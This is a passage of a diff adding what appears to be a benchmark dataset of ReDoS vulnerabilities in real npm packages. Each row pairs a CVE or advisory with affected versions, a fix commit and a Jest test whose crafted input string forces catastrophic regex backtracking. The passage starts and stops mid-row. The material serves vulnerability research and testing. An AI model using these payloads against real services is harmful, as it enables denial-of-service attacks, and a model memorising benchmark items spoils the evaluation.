+  expect(time).toBeGreaterThan(1);
+});
+",n/a,util.js:143:14,https://security.snyk.io/vuln/SNYK-JS-AJV-584908; 
+redos,,truncate,2.0.0,2.0.1,redos/truncate_2.0.0,"test(""ReDos in truncate"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const truncate = require(""truncate"");
+  let prefix = ""-@w--w--"";
+  let pump = ""ww--"";
+  let suffix = """";
+  let nPumps = 20000;
+  let attackString = prefix;
+  for (var i = 0; i < nPumps; i++) {
+    attackString += pump;
+  }
+  attackString += suffix;
+  let input = ""Hey "" + attackString;
+  let t = measureTime(function () {
+    truncate(input, 4);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/FGRibreau/node-truncate/commit/a3cea056427b2dfbbffebf24a95419b09db23b22,truncate.js:47:33,https://security.snyk.io/vuln/npm:truncate:20180225; 
+redos,,ducktype,1.2.0,1.2.1,redos/ducktype_1.2.0,"test(""ReDos in ducktype"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const ducktype = require(""ducktype"");
+  let attack_str = ""https://"" + (""."" + ""a"".repeat(110)).repeat(7) + ""\n"";
+  let t = measureTime(function () {
+    console.log(ducktype.url.test(attack_str));
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/josdejong/ducktype/commit/d8b4c902598c9104d5c56225c3fffcbe1368eff6,ducktype.js:165:24,https://security.snyk.io/vuln/npm:ducktype:20180219; 
+redos,CVE-2021-3795,semver-regex,3.1.1,3.1.3,redos/semver-regex_3.1.1,"test(""ReDos in semver-regex"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const semverRegex = require(""semver-regex"");
+  let version = ""v1.1.3-0a"";
+  for (let i = 0; i < 20; i++) {
+    version += ""a.a"";
+  }
+  let attack_str = version + ""aaaaaaa$"";
+  let t = measureTime(function () {
+    semverRegex().test(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/sindresorhus/semver-regex/commit/11c66245f4e1976dccc52977ed183696a21a3fd7,jasmineAsyncInstall.js:106:37,https://security.snyk.io/vuln/SNYK-JS-SEMVERREGEX-1585624; https://github.com/advisories/GHSA-44c6-4v22-4mhx
+redos,CVE-2021-3777,tmpl,1.0.0,1.0.5,redos/tmpl_1.0.0,"test(""ReDoS in tmpl"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const tmpl = require(""tmpl"");
+  let payload = ""hello, "" + ""{"".repeat(7 * 10000) + ""day"";
+  let t = measureTime(function () {
+    tmpl(payload, { day: ""tomorrow"" });
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/daaku/nodejs-tmpl/commit/4c654e4d1542f329ed561fd95ccd80f30c6872d6,tmpl.js:8:9,https://security.snyk.io/vuln/SNYK-JS-TMPL-1583443; https://github.com/advisories/GHSA-jgrx-mgxx-jf9v
+redos,CVE-2017-16115,timespan,2.3.0,n/a,redos/timespan_2.3.0,"test(""ReDos in timespan"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const timespan = require(""timespan"");
+  let t = measureTime(function () {
+    var ts = new timespan.parseDate(""NOW-"" + genstr(30000, ""1"") + ""milli"");
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,time-span.js:385:30,https://security.snyk.io/vuln/npm:timespan:20170907; https://github.com/advisories/GHSA-f523-2f5j-gfcg
+redos,CVE-2021-23425,trim-off-newlines,1.0.0,1.0.3,redos/trim-off-newlines_1.0.0,"//https://security.snyk.io/vuln/SNYK-JS-TRIMOFFNEWLINES-1296850
+test(""ReDos in trim-off-newlines"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const trim = require(""trim-off-newlines"");
+
+  const s = ""a"" + ""\n"".repeat(45000) + ""a"";
+
+  let t = measureTime(function () {
+    trim(s);
+  });
+
+  let time = t[0] + t[1] / 1000000000;
+
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/stevemao/trim-off-newlines/commit/6226c958cbbac284a840010eb1f6617fb99a5645,index.js:6:13,https://security.snyk.io/vuln/SNYK-JS-TRIMOFFNEWLINES-1296850; https://github.com/advisories/GHSA-38fc-wpqx-33j7
+redos,CVE-2021-23346,html-parse-stringify2,2.0.1,n/a,redos/html-parse-stringify2_2.0.1,"test(""ReDos in html-parse-stringify2"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const HTML = require(""html-parse-stringify2"");
+  let html = ""<!''''''''''''''''''''''''''''''''''''''''!"";
+  let t = measureTime(function () {
+    let ast = HTML.parse(html);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/HenrikJoreteg/html-parse-stringify/commit/c7274a48e59c92b2b7e906fedf9065159e73fe12,parse.js:39:10,https://security.snyk.io/vuln/SNYK-JS-HTMLPARSESTRINGIFY2-1079307; https://github.com/advisories/GHSA-545q-3fg6-48m7
+redos,CVE-2021-36716,is-email,1.0.0,1.0.1,redos/is-email_1.0.0,"test(""ReDos in is-email"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const isEmail = require(""is-email"");
+  let attack_str = """" + genstr(3000, ""@"") + ""!"";
+  let t = measureTime(function () {
+    isEmail(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/segmentio/is-email/commit/060ecedf345729f11ad857ccaf7a915ff6797739,index.js:13:18,https://security.snyk.io/vuln/SNYK-JS-ISEMAIL-1279002; https://github.com/advisories/GHSA-j377-2x76-558h
+redos,,markdown,0.3.0,,redos/markdown_0.3.0,"test(""ReDos in markdown-js"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const markdown = require(""markdown"").markdown;
+  const { genstr } = require(""../utils"");
+  attack_str = ""cispa"" + genstr(300000, ""_"");
+  let t = measureTime(function () {
+    html_content = markdown.toHTML(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",,,https://security.snyk.io/vuln/SNYK-JS-MARKDOWN-597156; https://github.com/advisories/GHSA-wx77-rp39-c6vg
+redos,,ethers,5.2.0,5.4.7,redos/ethers_5.2.0,"test(""ReDos in ethers"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const { ethers } = require(""ethers"");
+  let attack_str = ""a"" + "" "".repeat(33000) + ""a"";
+  let t = measureTime(function () {
+    try {
+      ethers.utils.parseEther(""1."" + ""0"".repeat(60000) + ""1"");
+    } catch (e) {}
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/ethers-io/ethers.js/commit/32a6b2a362815eb85ce3f3abad5adf92f2b80e10,fixednumber.js:97:36,https://security.snyk.io/vuln/SNYK-JS-ETHERS-1586048; 
+redos,,terminal-kit,2.1.0,2.1.8,redos/terminal-kit_2.1.0,"test(""ReDos in terminal-kit"", () => {
+  const termkit = require(""terminal-kit"");
+  const measureTime = require(""../utils"").measureTime;
+
+  let payload = ""^["".repeat(35000);
+
+  let t = measureTime(function () {
+    termkit.markupWidth(payload);
+  });
+
+  let time = t[0] + t[1] / 1000000000;
+
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/cronvel/terminal-kit/commit/a2e446cc3927b559d0281683feb9b821e83b758c,misc.js:185:35,https://security.snyk.io/vuln/SNYK-JS-TERMINALKIT-1734787; 
+redos,CVE-2021-23354,printf,0.6.0,0.6.1,redos/printf_0.6.0,"test(""ReDos in printf"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const printf = require(""printf"");
+  let t = measureTime(function () {
+    let attack_str = ""%(0)0"" + genstr(1000, ""0"") + ""\u25CE"";
+    printf(attack_str, -42);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,printf.js:14:21,https://security.snyk.io/vuln/SNYK-JS-PRINTF-1072096; https://github.com/advisories/GHSA-xfhp-gmh8-r8v2
+redos,CVE-2021-23424,ansi-html,0.0.7,n/a,redos/ansi-html_0.0.7,"test(""ReDoS in ansi-html"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  let t = measureTime(function () {
+    require(""ansi-html"")(""\x1B[0m\x1B["" + ""0"".repeat(30));
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,index.js:62:18,https://security.snyk.io/vuln/SNYK-JS-ANSIHTML-1296849; https://github.com/advisories/GHSA-whgm-jr23-g3j9
+redos,CVE-2018-3737,sshpk,1.13.1,1.14.1,redos/sshpk_1.13.1,"test(""ReDos in sshpk"", () => {
+  const sshpk = require(""sshpk"");
+  const measureTime = require(""../utils"").measureTime;
+  let t = measureTime(function () {
+    let keyPub = `ssh-rsa a${"" "".repeat(30000)}x\nx`;
+    try {
+      sshpk.parseKey(keyPub, ""ssh"");
+    } catch (e) {}
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,ssh.js:28:18,https://security.snyk.io/vuln/npm:sshpk:20180409; https://github.com/advisories/GHSA-2m39-62fm-q8r3
+redos,CVE-2017-16118,forwarded,0.1.0,0.1.2,redos/forwarded_0.1.0,"test(""ReDos in forwarded"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  var fresh = require(""forwarded"");
+  var str = ""x"" + genstr(60000, "" "") + ""x"";
+  let t = measureTime(function () {
+    fresh({
+      headers: { ""x-forwarded-for"": str },
+      connection: { remoteAddress: ""0.0.0.0"" },
+    });
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/jshttp/forwarded/commit/d469116eda4931fbe1c0ccb29497b35930bfa328,index.js:27:6,https://security.snyk.io/vuln/npm:forwarded:20170908; https://github.com/advisories/GHSA-mpcf-4gmh-23w8
+redos,CVE-2021-23367,is-svg,4.2.2,4.3.0,redos/is-svg_4.2.2,"test(""ReDos in is-svg"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const isSvg = require(""is-svg"");
+  let attack_str = ""<!Entity"" + genstr(25000, "" "");
+  let t = measureTime(function () {
+    isSvg(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/sindresorhus/is-svg/commit/732fc72779840c45a30817d3fe28e12058592b02,index.js:21:13,https://security.snyk.io/vuln/SNYK-JS-ISSVG-1243891; https://github.com/advisories/GHSA-7r28-3m3f-r2pr
+redos,,colors-cli,1.0.25,1.0.28,redos/colors-cli_1.0.25,"test(""ReDos in colors-cli"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const color = require(""colors-cli/safe"");
+  let attack_str = ""\x1B["" + "";"".repeat(20000);
+  let t = measureTime(function () {
+    color.red(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/jaywcjlove/colors-cli/commit/78ee15ba9111ddee1cc0640ccd79369525bd57b8,color-safe.js:60:23,https://security.snyk.io/vuln/SNYK-JS-COLORSCLI-1584218; 
+redos,,valid-email,0.0.1,1.0.0,redos/valid-email_0.0.1,"test(""ReDos in valid-email"", () => {
+  const validate = require(""valid-email"");
+  const measureTime = require(""../utils"").measureTime;
+  var pump = ""\\\\a\\\\\\a"";
+  var attackString = """";
+  for (var i = 0; i < 9; i++) {
+    attackString += pump;
+  }
+  attackString += ""\x0B"";
+  var badEmail = `${attackString}@google.com`;
+  let t = measureTime(function () {
+    validate(badEmail);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/johnhenry/valid-email/commit/624ffa60b42bed8c577a679d682dda286b4603e6,utils.js:391:28,https://security.snyk.io/vuln/npm:valid-email:20180222; 
+redos,,htmlparser,1.7.7,n/a,redos/htmlparser_1.7.7,"test(""ReDos in htmlparser"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const htmlparser = require(""htmlparser"");
+  let rawHtml = ""<html><x"" + genstr(50000, "" "") + ""x></html>"";
+  let handler = new htmlparser.DefaultHandler(function (error, dom) {});
+  let parser = new htmlparser.Parser(handler);
+  let t = measureTime(function () {
+    parser.parseComplete(rawHtml);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,htmlparser.js:226:72,https://security.snyk.io/vuln/npm:node-htmlparser-classic:20170906; 
+redos,CVE-2021-23362,hosted-git-info,3.0.0,3.0.8,redos/hosted-git-info_3.0.0,"test(""ReDos in hosted-git-info"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const hostedGitInfo = require(""hosted-git-info"");
+  var attack_str = ""a:"" + genstr(49000, ""a"") + ""!"";
+  let t = measureTime(function () {
+    var parsedInfo = hostedGitInfo.fromUrl(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/npm/hosted-git-info/commit/bede0dc38e1785e732bf0a48ba6f81a4a908eba3,index.js:44:27,https://security.snyk.io/vuln/SNYK-JS-HOSTEDGITINFO-1088355; https://github.com/advisories/GHSA-43f8-2h32-f4cj
+redos,CVE-2020-7661,urlregex,0.5.0,n/a,redos/urlregex_0.5.0,"test(""ReDos in urlregex"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const urlRegex = require(""urlregex"");
+  let t = measureTime(function () {
+    const isValid = urlRegex().test(
+      ""http://huntr.devtestvulnerability2312321.testvulnerability2312321.testvulnerability2312321.testvulnerability2312321.testvulnerability2312321""
+    );
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,jasmineAsyncInstall.js:106:37,https://github.com/advisories/GHSA-v4rh-8p82-6h5w; https://security.snyk.io/vuln/SNYK-JS-URLREGEX-569472
+redos,CVE-2020-1920,react-native,0.63.0-rc.0,0.64.1,redos/react-native_0.63.0-rc.0,"function validateBaseUrl(url) {
+  return /^(?:(?:(?:https?|ftp):)?\/\/)(?:(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,}))?)(?::\d{2,5})?(?:[/?#]\S*)?$/i.test(
+    url
+  );
+}
+test(""ReDos in react-native"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  let t = measureTime(function () {
+    validateBaseUrl(
+      ""http://foobar.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.00.""
+    );
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/facebook/react-native/commit/ca09ae82715e33c9ac77b3fa55495cf84ba891c7,jasmineAsyncInstall.js:106:37,https://security.snyk.io/vuln/SNYK-JS-REACTNATIVE-1298632; https://github.com/advisories/GHSA-7f53-fmmv-mfjv
+redos,CVE-2021-23388,ms,0.7.0,1.2.1,redos/ms_0.7.0,"test(""ReDos in ms"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const ms = require(""ms"");
+  let attack_str = genstr(20000, ""1"") + ""x"";
+  let t = measureTime(function () {
+    ms(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/caolan/forms/pull/214/commits/d4bd5b5febfe49c1f585f162e04ec810f8dc47a0,index.js:41:135,https://security.snyk.io/vuln/npm:ms:20170412; https://github.com/advisories/GHSA-c56f-grv3-gpfr
+redos,CVE-2020-7767,express-validators,1.0.3,n/a,redos/express-validators_1.0.3,"test(""ReDos in express-validators"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const expressValidators = require(""express-validators"");
+  var Obj = { urlValue: ""http://--:$$@------------------------------------!"" };
+  var rules = { urlValue: ""url"" };
+  var messages = { urlValue: { url: ""https://www.google.com/"" } };
+  let t = measureTime(function () {
+    expressValidators.validator(Obj, rules, messages, function (
+      err,
+      validated
+    ) {});
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,index.js:615:23,https://security.snyk.io/vuln/SNYK-JS-EXPRESSVALIDATORS-1017404; https://github.com/advisories/GHSA-cf2x-rqc8-grfq
+redos,,amqp-match,0.0.0,n/a,redos/amqp-match_0.0.0,"test(""ReDoS in amqp-match"", () => {
+  const match = require(""amqp-match"");
+  const measureTime = require(""../utils"").measureTime;
+  let t = measureTime(function () {
+    match(""f"" + ""0"".repeat(19), ""#.bar"");
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,index.js:4:17,https://security.snyk.io/vuln/npm:amqp-match:20170515; 
+redos,CVE-2021-23346,html-parse-stringify,2.0.0,2.0.1,redos/html-parse-stringify_2.0.0,"test(""ReDos in html-parse-stringify"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const HTML = require(""html-parse-stringify"");
+  let html = ""<!''''''''''''''''''''''''''''''''''''''''!"";
+  let t = measureTime(function () {
+    let ast = HTML.parse(html);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/HenrikJoreteg/html-parse-stringify/commit/c7274a48e59c92b2b7e906fedf9065159e73fe12,html-parse-stringify.js:1:1428,https://security.snyk.io/vuln/SNYK-JS-HTMLPARSESTRINGIFY-1079306; https://github.com/advisories/GHSA-545q-3fg6-48m7
+redos,CVE-2021-35065,glob-parent,5.0.0,6.0.1,redos/glob-parent_5.0.0,"test(""ReDos in glob-parent"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const globParent = require(""glob-parent"");
+  let attack_str = ""{"" + genstr(3000, ""/"");
+  let t = measureTime(function () {
+    globParent(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/gulpjs/glob-parent/commit/3e9f04a3b4349db7e1962d87c9a7398cda51f339,index.js:20:17,https://security.snyk.io/vuln/SNYK-JS-GLOBPARENT-1314294; https://github.com/advisories/GHSA-ww39-953v-wcq6
+redos,,validator,13.5.2,13.6.0,redos/validator_13.5.2,"test(""ReDos in validator"", () => {
+  function build_attack(n) {
+    var ret = ""111""
+    for (var i = 0; i < n; i++) {
+      ret += ""a""
+    }
+  
+    return ret+""_"";
+  }
+
+  var validator = require(""validator"");
+  const measureTime = require(""../utils"").measureTime;
+  var attack_str = build_attack(40004);
+  let t = measureTime(function () {
+    validator.isSlug(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/tux-tn/validator.js/commit/b21879cf45c05ee11b2d79e612b651bf7b2d93b7#diff-f41087599986e29c3c0dc15b62f1bf96d8aba16fe41f3730e315c84c2c4cb311,,https://security.snyk.io/vuln/SNYK-JS-VALIDATOR-1090599; 
+redos,,cejs,2.0.20170212,2.0.20180219,redos/cejs_2.0.20170212,"test(""ReDoS in cejs"", () => {
+  const c = require(""cejs"");
+  const measureTime = require(""../utils"").measureTime;
+  attack_str = ""."".repeat(7000000) + ""\n%"";
+  let t = measureTime(function () {
+    c.run(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/kanasimi/CeJS/commit/c6a9ffec1152781f268b8d72d80ee4d8fc837986,,https://security.snyk.io/vuln/npm:cejs:20180217; 
+redos,CVE-2017-16098,charset,1.0.0,1.0.1,redos/charset_1.0.0,"test(""ReDoS in charset"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const charset = require(""charset"");
+  let t = measureTime(function () {
+    charset(""encoding="" + "" "".repeat(40000));
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,charset.js:59:26,https://security.snyk.io/vuln/npm:charset:20170908; https://github.com/advisories/GHSA-9cp3-fh5x-xfcj
+redos,CVE-2021-23364,browserslist,4.16.4,4.16.5,redos/browserslist_4.16.4,"test(""ReDoS in browserslist"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const browserslist = require(""browserslist"");
+  let t = measureTime(function () {
+    try {
+      browserslist(""> "" + ""1"".repeat(25000) + ""!"");
+    } catch (e) {}
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/browserslist/browserslist/commit/c091916910dfe0b5fd61caad96083c6709b02d98,index.js:333:29,https://security.snyk.io/vuln/SNYK-JS-BROWSERSLIST-1090194; https://github.com/advisories/GHSA-w8qv-6jwh-64r5
+redos,CVE-2019-12041,remarkable,1.7.2,1.7.3,redos/remarkable_1.7.2,"test(""ReDos in remarkable"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const Remarkable = require(""remarkable"");
+  let md = new Remarkable(""commonmark"");
+  let t = measureTime(function () {
+    let attack_str =
+      `# Remarkable rulezz!<a>z</a><![CDATA[` + genstr(9000000, ""a"") + `]] >`;
+    md.render(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/jonschlinkert/remarkable/pull/335/commits/b8bb2c0987f06d2b34e882159249f1538c6dc380,,https://security.snyk.io/vuln/SNYK-JS-REMARKABLE-174639; https://github.com/advisories/GHSA-q22g-8fr4-qpj4
+redos,CVE-2020-7661,url-regex,5.0.0,n/a,redos/url-regex_5.0.0,"test(""ReDos in url-regex"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  let t = measureTime(function () {
+    require(""url-regex"")({ strict: false }).test(
+      ""018137.113.425.552.100.215.144.175250.45.147.1364868726sgdm6nohQ""
+    );
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,jasmineAsyncInstall.js:106:37,https://security.snyk.io/vuln/SNYK-JS-URLREGEX-569472; https://github.com/advisories/GHSA-v4rh-8p82-6h5w
+redos,,is-url,1.2.2,1.2.4,redos/is-url_1.2.2,"test(""ReDos in is-url"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  let t = measureTime(function () {
+    const isurl = require(""is-url"");
+    isurl(""a://localhost"" + ""9"".repeat(40000) + ""\t"");
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,index.js:22:18,https://security.snyk.io/vuln/npm:is-url:20180319; 
+redos,CVE-2021-27292,ua-parser-js,0.7.22,0.7.24,redos/ua-parser-js_0.7.22,"test(""ReDos in ua-parser-js"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const ua_parser = require(""ua-parser-js"");
+  let t = measureTime(function () {
+    const N_SIZE = 50000;
+    const MALICIOUS_UA = `android;Trio${"" "".repeat(N_SIZE)}buil`;
+    ua_parser(MALICIOUS_UA);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/faisalman/ua-parser-js/commit/809439e20e273ce0d25c1d04e111dcf6011eb566,ua-parser.js:98:42,https://security.snyk.io/vuln/SNYK-JS-UAPARSERJS-1072471; https://github.com/advisories/GHSA-78cj-fxph-m83p
+redos,CVE-2020-7754,npm-user-validate,1.0.0,1.0.1,redos/npm-user-validate_1.0.0,"test(""ReDos in npm-user-validate"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const npmu = require(""npm-user-validate"");
+  let attack_str = ""@"" + genstr(40000, ""@"") + ""!"";
+  let t = measureTime(function () {
+    npmu.email(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/npm/npm-user-validate/commit/c8a87dac1a4cc6988b5418f30411a8669bef204e,npm-user-validate.js:48:11,https://security.snyk.io/vuln/SNYK-JS-NPMUSERVALIDATE-1019352; https://github.com/advisories/GHSA-pw54-mh39-w3hc
+redos,CVE-2017-16021,uri-js,2.1.1,3.0.0,redos/uri-js_2.1.1,"test(""ReDos in uri-js"", () => {
+  const uri = require(""uri-js"");
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  let t = measureTime(function () {
+    uri.parse(genstr(8, ""/%c0%ae%c0%ae"") + ""/windows\\win.ini"");
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,uri.js:175:33,https://security.snyk.io/vuln/npm:uri-js:20160804; https://github.com/advisories/GHSA-333w-rxj3-f55r
+redos,CVE-2020-28496,three,0.122.0,0.125.0,redos/three_0.122.0,"test(""ReDos in three"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const three = require(""three"");
+  let attack_str = ""rgb("" + genstr(50000, "" "") + """";
+  let t = measureTime(function () {
+    var Color = three.Color;
+    new Color(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/mrdoob/three.js/pull/21143/commits/4a582355216b620176a291ff319d740e619d583e,three.js:6333:46,https://security.snyk.io/vuln/SNYK-JS-THREE-1064931; https://github.com/advisories/GHSA-fq6p-x6j3-cmmq
+redos,CVE-2017-16136,method-override,2.0.0,2.3.10,redos/method-override_2.0.0,"test(""ReDos in method-override"", () => {
+  const methodOverride = require(""method-override"");
+  const measureTime = require(""../utils"").measureTime;
+  let t = measureTime(function () {
+    let middleware = methodOverride();
+    middleware(
+      {
+        headers: { ""x-http-method-override"": "" "".repeat(40000) },
+        method: ""POST"",
+      },
+      {
+        getHeader: () => {
+          return """";
+        },
+        setHeader: () => {},
+      },
+      () => {}
+    );
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/expressjs/method-override/commit/4c58835a61fdf7a8e070d6f8ecd5379a961d0987,index.js:113:40,https://security.snyk.io/vuln/npm:method-override:20170927; https://github.com/advisories/GHSA-qx2f-477c-35rq
+redos,,clean-css,4.1.10,4.1.11,redos/clean-css_4.1.10,"test(""ReDoS in clean-css"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const CleanCSS = require(""clean-css"");
+  let prefix = ""-+.0"";
+  let suffix = ""-0"";
+  let input;
+  let pump = [];
+  for (i = 0; i < 10000; i++) {
+    pump.push(""0000000000"");
+  }
+  input =
+    "".block{animation:1s test;animation-duration:"" +
+    prefix +
+    pump.join("""") +
+    suffix +
+    ""s}"";
+  let t = measureTime(function () {
+    new CleanCSS({
+      level: {
+        1: { replaceZeroUnits: false },
+        2: true,
+      },
+    }).minify(input);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/jakubpawlowicz/clean-css/commit/2929bafbf8cdf7dccb24e0949c70833764fa87e3,validator.js:418:20,https://security.snyk.io/vuln/npm:clean-css:20180306; 
+redos,,underscore.string,3.3.4,3.3.6,redos/underscore.string_3.3.4,"test(""ReDos in underscore.string"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const us = require(""underscore.string"");
+  let t = measureTime(function () {
+    var agent = us.unescapeHTML(genstr(50000, ""&""));
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,unescapeHTML.js:5:26,https://security.snyk.io/vuln/npm:underscore.string:20170908; https://github.com/advisories/GHSA-v2p6-4mp7-3r9v
+redos,,minimatch,3.0.0,3.0.2,redos/minimatch_3.0.0,"test(""ReDos in minimatch"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const minimatch = require(""minimatch"");
+  let attack_str = ""[!"" + genstr(7000000, ""\\"") + ""A"";
+  let t = measureTime(function () {
+    minimatch(""foo"", attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/isaacs/minimatch/commit/6944abf9e0694bd22fd9dad293faa40c2bc8a955,minimatch.js:167:14,https://security.snyk.io/vuln/SNYK-JS-MINIMATCH-1019388; https://github.com/advisories/GHSA-hxm2-r34f-qmc5
+redos,CVE-2021-23382,postcss,8.0.0,7.0.36,redos/postcss_8.0.0,"function build_attack(n) {
+  var ret = ""/*# sourceMappingURL="";
+  for (var i = 0; i < n; i++) {
+    ret += "" "";
+  }
+  return ret + ""!"";
+}
+test(""ReDos in postcss"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const postcss = require(""postcss"");
+  let attack_str = build_attack(50000);
+  let t = measureTime(function () {
+    try {
+      postcss.parse(attack_str);
